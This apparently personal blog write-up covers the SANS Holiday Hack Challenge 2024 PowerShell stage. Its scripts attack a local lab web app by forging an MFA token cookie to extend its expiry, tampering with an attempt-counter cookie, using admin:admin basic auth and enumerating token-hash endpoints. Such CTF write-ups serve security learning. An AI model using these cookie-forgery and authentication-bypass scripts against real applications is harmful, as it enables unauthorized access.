+++ 
draft = false
date = 2025-01-26T14:58:33+01:00
title = "HHC24 - Powershell"
description = "Powershell challenge aimed for web-based application"
slug = ""
authors = []
tags = [
    "HHC24",
    "Sans",
    "CTF",
]
categories = [
    "Writeup",
    "Poweshell",
    "Automation",
    "Web-Application Hacking",
    "Authorization",
    "Authentication"

]
externalLink = ""
series = [
    "HHC24",
]
+++


## Silver 🥈

- **Disclaimer**: I started doing this challenge during my frustration for GOLD stage of Snowball challenge, so I started to make notes in later stage...

- Looking for endpoint which had content of 138 words.

```powershell
foreach ($link in $links.href){
   if ((Invoke-WebRequest -Uri $link -Headers $Headers | Measure-Object -word).Words -eq 138){
    (Invoke-WebRequest -Uri $link -Headers $Headers).content
   }
} 
```

### Stage 8

```Powershell
Import-Csv = @(Invoke-WebRequest -Uri 'http://127.0.0.1:1225/token_overview.csv' -Headers $Headers).content
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```

### Stage 9

```Powershell
# Create a new web request session
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Create a new cookie and set the name, value, and domain
$cookie = New-Object System.Net.Cookie('token', '5f8dd236f862f4507835b0e418907ffc')
$cookie.Domain = "127.0.0.1"

# Add the cookie to the session's cookie container
$session.Cookies.Add($cookie)

# Define the API endpoint
$link = "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"

# Send the GET request with the web request session
$response = Invoke-WebRequest -Uri $link -WebSession $session -Headers $Headers

# Output the response content
$response.Content
```

### Stage 10

```html
<h1>Cookie 'mfa_code', use it at <a href='1732994526.5978212'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
```

```powershell
# Create URI parameter
$link = "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"

# Create a new web request session
# $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Create a new cookie and set the name, value, and domain
$cookie = New-Object System.Net.Cookie('mfa_token', '1732994526.5978212')
$cookie.Domain = "127.0.0.1"

# Add the cookie to the session's cookie container
$session.Cookies.Add($cookie)

# Send the GET request with the web request session
$response = Invoke-WebRequest -Uri $link -WebSession $session -Headers $Headers

# Output the response content
$response.Content
```

```html
<h1>[!] System currently in lock down</h1><br><h1>[!] Failure, token has expired. [*] Default timeout set to 2s for security reasons</h1>
```

- The token needs to be modified for longer validity:

```powershell
$cookie = New-Object System.Net.Cookie('mfa_token', '9932994526.5978212')
```

```html
<h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==</p>
```

- Base64 Decode: ```Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction```

```powershell
$username =  'elf'
$password = 'SnowLeopard2ReadyForAction'
$credentials = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1} -f $username, $password")))

$BasicAuth = "Basic $credentials"
$Headers = @{ Authorization = $BasicAuth}

Invoke-WebRequest -Uri $link -WebSession $webSession -Headers
```

- Silver was obtained 🥈

## Gold 🥇

**Summary:**


- **Basic Auth** admin:admin
- **Base URL**: "127.0.0.1:1225"


From previous stages we have following log message:

```md
# [*] SYSTEMLOG
# [*] defense mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
" to type "System.Char". Error: "String must be exactly one character long."
```

According to this and information provided from Elf, we need to make **SHA256SUM** of **MD5 Tokens** to get new endpoint.

MD5 Tokens:

```bash
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
```

Know endpoint:
<http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C>

Let's create a script which will create SHA256 from tokens and access the endpoints:

```Powershell
# Define the hashes as a comma-separated string

$temp_hash = "32b9401a6d972f8c1a98de145629ea9d,3a79238df0a92ab0afa44a85f914fc3b,49c2a68b21b9982aa9fd64cf0fd79f72,f8142c1304efb9b7e9a7f57363c2d286,706457f6dd78729a8bed5bae1efaeb50,bb0564aa5785045937a35a9fa3fbbc73,4173a7bc22aee35c5fc48261b041d064,198b8bf2cd30a7c7fed464cca1720a88,3a7c8ecffeeadb164c31559f8f24a1e7,288e60e318d9ad7d70d743a614442ffc,87ab4cb29649807fdb716ac85cf560ea,89f3ec1275407c9526a645602d56e799,33539252b40b5c244b09aee8a57adbc9,152899789a191d9e9150a1e3a5513b7f,7cd48566f118a02f300cdfa75dee7863,d798a55fca64118cea2df3c120f67569,6ef5570cd43a3ec9f43c57f662201e55,bf189d47c3175ada98af398669e3cac3,743ac25389a0b430dd9f8e72b2ec9d7f,270aabd5feaaf40185f2effa9fa2cd6e,8b58850ee66bd2ab7dd2f5f850c855f8,6fd00cbda10079b1d55283a88680d075,612001dd92369a7750c763963bc327f0,010f2cc580f74521c86215b7374eead6,29860c67296d808bc6506175a8cbb422,7b7f6891b6b6ab46fe2e85651db8205f,45ffb41c4e458d08a8b08beeec2b4652,d0e6bfb6a4e6531a0c71225f0a3d908d,bd7efda0cb3c6d15dd896755003c635c,5be8911ced448dbb6f0bd5a24cc36935,1acbfea6a2dad66eb074b17459f8c5b6,0f262d0003bd696550744fd43cd5b520,8cac896f624576d825564bb30c7250eb,8ef6d2e12a58d7ec521a56f25e624b80,b4959370a4c484c10a1ecc53b1b56a7d,38bdd7748a70529e9beb04b95c09195d,8d4366f08c013f5c0c587b8508b48b15,67566692ca644ddf9c1344415972fba8,8fbf4152f89b7e309e89b9f7080c7230,936f4db24a290032c954073b3913f444,c44d8d6b03dcd4b6bf7cb53db4afdca6,cb722d0b55805cd6feffc22a9f68177d,724d494386f8ef9141da991926b14f9b,67c7aef0d5d3e97ad2488babd2f4c749"

# $temp_hash = "5f8dd236f862f4507835b0e418907ffc"
# Split the hashes into an array
$temp_hash = $temp_hash.Split(',')

# Generate temporary files for each hash
foreach ($hash in $temp_hash) {
    Set-Content -Path "$hash.txt" -Value $hash
}

# Get the list of temporary files
$temp_files = Get-ChildItem -Filter *.txt

# Calculate file hashes and prepare the result object
$result = foreach ($file in $temp_files) {
    [PSCustomObject]@{
        hash  = (Get-FileHash $file.FullName).Hash
        token = $file.Name -replace "\.txt$", ""
    }
}
# Remove the temporary files
Remove-Item *.txt
```

- Now we have the hashes and we need to enumerate the endpoint, however I loose my script for that, but it is not important as we need to use it as skeleton for next part.
- Same as for silver, we need to send the token to get MFA validation.
- Problem is that we need to validate the token for each endpoint 10 times. <- This we know from Elf's hints as protection EDR (Elf Detection and Response)
- All wrapped in one script:
- *I know it is not the prettiest script, but I have to modified it on run and debug as I was getting `500 Internal error`*

```Powershell
# Basic authentication setup
$username = 'admin'
$password = 'admin'
$credentials = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($username + ":" + $password)))
$BasicAuth = "Basic $credentials"
$Headers = @{ Authorization = $BasicAuth }

# Number of repetitions for looping
$repetitions = 11

for ($i = 1; $i -lt $repetitions; $i++) {
    # Loop through the result 11 times
    foreach ($endpoint in $result) {
        # Create a new web request session
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

        # Configure the cookies
        $cookie1 = New-Object System.Net.Cookie('token', $endpoint.token)
        $cookie1.Domain = "127.0.0.1"
        $cookie2 = New-Object System.Net.Cookie('mfa_token', '9932994526.5978212')
        $cookie2.Domain = "127.0.0.1"

        $session.Cookies.Add($cookie1)
        $session.Cookies.Add($cookie2)

        # Define the API endpoint
        $link = "http://127.0.0.1:1225/tokens/$($endpoint.hash)"

        # Send the GET request with cookies and authorization header
        $request = Invoke-WebRequest -Uri $link -WebSession $session -Headers $Headers

        # Check if the request was successful
        if ($request.StatusCode -eq 200) {
            # Output the endpoint and response content
            Write-Output $request.Content

            # Parse the outerHTML string from the response
            $outerHTML = $request.Links.outerHTML

            # Regex pattern to extract the href value and the link text
            $pattern = "<a href='([^']*)'>([^<]*)</a>"

            # Match the outerHTML with the regex pattern
            if ($outerHTML -match $pattern) {
                    $hrefValue = $matches[1]
                    $linkText = $matches[2]

                    
                    $baseUrl = "http://127.0.0.1:1225"
                    $fullUrl = "$baseUrl$linkText"
                    if ($i -lt 10){
                        $value = "0$($i)"
                    }
                    if ($i -eq 10){
                        $value = "10"
                    }
                    $cookie3 = New-Object System.Net.Cookie('attempts', "c25ha2VvaWwK$value", "/")
                    $cookie3.Domain = "127.0.0.1"
                    $session.Cookies.Add($cookie3)

                    # Follow the link
                    $secondaryResponse = Invoke-WebRequest -Uri $fullUrl -WebSession $session -Headers $Headers
                    if ($secondaryResponse.StatusCode -eq 500){
                        break
                    }

                    # Output the response content
                    Write-Output $secondaryResponse.Content
                    Start-Sleep -Seconds 0.2
                } 
            }
        }
    }

```

- I got gold 🥇 following script:

```powershell
# Define the hashes as a comma-separated string

$temp_hash = "32b9401a6d972f8c1a98de145629ea9d,3a79238df0a92ab0afa44a85f914fc3b,49c2a68b21b9982aa9fd64cf0fd79f72,f8142c1304efb9b7e9a7f57363c2d286,706457f6dd78729a8bed5bae1efaeb50,bb0564aa5785045937a35a9fa3fbbc73,4173a7bc22aee35c5fc48261b041d064,198b8bf2cd30a7c7fed464cca1720a88,3a7c8ecffeeadb164c31559f8f24a1e7,288e60e318d9ad7d70d743a614442ffc,87ab4cb29649807fdb716ac85cf560ea,89f3ec1275407c9526a645602d56e799,33539252b40b5c244b09aee8a57adbc9,152899789a191d9e9150a1e3a5513b7f,7cd48566f118a02f300cdfa75dee7863,d798a55fca64118cea2df3c120f67569,6ef5570cd43a3ec9f43c57f662201e55,bf189d47c3175ada98af398669e3cac3,743ac25389a0b430dd9f8e72b2ec9d7f,270aabd5feaaf40185f2effa9fa2cd6e,8b58850ee66bd2ab7dd2f5f850c855f8,6fd00cbda10079b1d55283a88680d075,612001dd92369a7750c763963bc327f0,010f2cc580f74521c86215b7374eead6,29860c67296d808bc6506175a8cbb422,7b7f6891b6b6ab46fe2e85651db8205f,45ffb41c4e458d08a8b08beeec2b4652,d0e6bfb6a4e6531a0c71225f0a3d908d,bd7efda0cb3c6d15dd896755003c635c,5be8911ced448dbb6f0bd5a24cc36935,1acbfea6a2dad66eb074b17459f8c5b6,0f262d0003bd696550744fd43cd5b520,8cac896f624576d825564bb30c7250eb,8ef6d2e12a58d7ec521a56f25e624b80,b4959370a4c484c10a1ecc53b1b56a7d,38bdd7748a70529e9beb04b95c09195d,8d4366f08c013f5c0c587b8508b48b15,67566692ca644ddf9c1344415972fba8,8fbf4152f89b7e309e89b9f7080c7230,936f4db24a290032c954073b3913f444,c44d8d6b03dcd4b6bf7cb53db4afdca6,cb722d0b55805cd6feffc22a9f68177d,724d494386f8ef9141da991926b14f9b,67c7aef0d5d3e97ad2488babd2f4c749"

# $temp_hash = "5f8dd236f862f4507835b0e418907ffc"
# Split the hashes into an array
$temp_hash = $temp_hash.Split(',')

# Generate temporary files for each hash
foreach ($hash in $temp_hash) {
    Set-Content -Path "$hash.txt" -Value $hash
}

# Get the list of temporary files
$temp_files = Get-ChildItem -Filter *.txt

# Calculate file hashes and prepare the result object
$result = foreach ($file in $temp_files) {
    [PSCustomObject]@{
        hash  = (Get-FileHash $file.FullName).Hash
        token = $file.Name -replace "\.txt$", ""
    }
}

# Remove the temporary files
Remove-Item *.txt

# Basic authentication setup
$username = 'admin'
$password = 'admin'
$credentials = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($username + ":" + $password)))
$BasicAuth = "Basic $credentials"
$Headers = @{ Authorization = $BasicAuth }

# Number of repetitions for looping
$repetitions = 11

for ($i = 1; $i -lt $repetitions; $i++) {
    # Loop through the result 11 times
    foreach ($endpoint in $result) {
        # Create a new web request session
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession

        # Configure the cookies
        $cookie1 = New-Object System.Net.Cookie('token', $endpoint.token)
        $cookie1.Domain = "127.0.0.1"
        $cookie2 = New-Object System.Net.Cookie('mfa_token', '9932994526.5978212')
        $cookie2.Domain = "127.0.0.1"

        $session.Cookies.Add($cookie1)
        $session.Cookies.Add($cookie2)

        # Define the API endpoint
        $link = "http://127.0.0.1:1225/tokens/$($endpoint.hash)"

        # Send the GET request with cookies and authorization header
        $request = Invoke-WebRequest -Uri $link -WebSession $session -Headers $Headers

        # Check if the request was successful
        if ($request.StatusCode -eq 200) {
            # Output the endpoint and response content
            Write-Output $request.Content

            # Parse the outerHTML string from the response
            $outerHTML = $request.Links.outerHTML

            # Regex pattern to extract the href value and the link text
            $pattern = "<a href='([^']*)'>([^<]*)</a>"

            # Match the outerHTML with the regex pattern
            if ($outerHTML -match $pattern) {
                    $hrefValue = $matches[1]
                    $linkText = $matches[2]

                    
                    $baseUrl = "http://127.0.0.1:1225"
                    $fullUrl = "$baseUrl$linkText"

                    #spaghetti from debug of 500 Error
                    if ($i -lt 10){
                        $value = "0$($i)"
                    }
                    if ($i -eq 10){
                        $value = "10"
                    }
                    # Setup of cookies needed for the last bit of the loop
                    $cookie3 = New-Object System.Net.Cookie('attempts', "c25ha2VvaWwK$value", "/")
                    $cookie3.Domain = "127.0.0.1"
                    $session.Cookies.Add($cookie3)

                    # Follow the link
                    $secondaryResponse = Invoke-WebRequest -Uri $fullUrl -WebSession $session -Headers $Headers
                    if ($secondaryResponse.StatusCode -eq 500){
                        break
                    }

                    # Output the response content
                    Write-Output $secondaryResponse.Content
                    Start-Sleep -Seconds 0.2
                } 
            }
        }
    }
```
